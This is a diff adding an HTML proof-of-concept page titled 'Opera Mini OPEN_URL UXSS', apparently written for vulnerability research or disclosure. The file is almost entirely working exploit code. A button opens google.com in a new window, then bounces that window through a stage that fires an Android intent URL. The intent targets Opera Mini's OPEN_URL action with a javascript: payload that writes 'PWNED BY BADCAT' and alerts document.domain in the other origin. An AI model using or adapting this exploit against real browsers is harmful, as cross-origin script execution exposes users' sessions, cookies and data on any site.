@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Opera Mini OPEN_URL UXSS</title>
+  <style>
+    body { font: 18px/1.5 sans-serif; margin: 2rem; color: #223; }
+    button { padding: 1rem 1.4rem; border: 0; border-radius: .6rem;
+      background: #c20b3a; color: white; font: 700 18px sans-serif; }
+    pre { white-space: pre-wrap; overflow-wrap: anywhere; }
+  </style>
+</head>
+<body>
+  <main id="app"></main>
+  <script>
+    const params = new URLSearchParams(location.search);
+    const app = document.querySelector('#app');
+    const exploit = 'intent://open/#Intent;action=com.opera.android.action.OPEN_URL;S.action_open_url=javascript%3Adocument.write%2528%2527PWNED%2520BY%2520BADCAT%2527%2529%253Balert%2528document.domain%2529;B.action_new_tab=false;B.action_inject_startpage=false;SEL;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;scheme=https;package=com.opera.mini.native;end';
+
+    if (params.get('stage') === 'bounce') {
+      app.innerHTML = '<h1>RUN EXPLOIT</h1>';
+      setTimeout(() => {
+        location.href = exploit;
+        history.back();
+      }, 100);
+    } else {
+      app.innerHTML = '<h1>OPEN_URL cross-origin UXSS</h1><button id="run" type="button">RUN ONE-CLICK POC</button><pre id="status"></pre>';
+      document.querySelector('#run').onclick = () => {
+        const victim = window.open('about:blank', 'openUrlUxssVictim');
+        victim.location.replace('https://www.google.com/');
+        document.querySelector('#status').textContent = 'Target opened; preparing the history transition…';
+
+        const bounce = new URL(location.href);
+        bounce.search = '';
+        bounce.searchParams.set('stage', 'bounce');
+        bounce.searchParams.set('t', String(Date.now()));
+        setTimeout(() => { victim.location.href = bounce.href; }, 500);
+      };
+    }
+  </script>
+</body>
+</html>
